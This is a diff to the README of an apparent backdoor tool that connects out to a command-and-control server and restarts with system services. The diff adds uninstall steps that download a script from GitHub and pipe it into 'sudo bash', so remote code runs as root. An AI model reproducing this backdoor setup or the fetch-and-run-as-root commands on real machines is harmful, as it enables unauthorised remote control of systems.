@@ -27,3 +27,14 @@ bash /tmp/install.sh <IP OF THE C&C server> <FREE PORT ON THE C&C SERVER>
 
 By default the backdoor will start alongside other system services. If the service can't connect to the command and control server, it will wait for a few seconds and reconnect immediately after.
 
+### Uninstalling
+
+```sh
+curl -sSL https://raw.githubusercontent.com/GermanBread/skid-begone/master/undo.sh | sudo bash
+```
+
+alternatively with wget:
+
+```sh
+wget -qq https://raw.githubusercontent.com/GermanBread/skid-begone/master/undo.sh -O - | sudo bash
+```
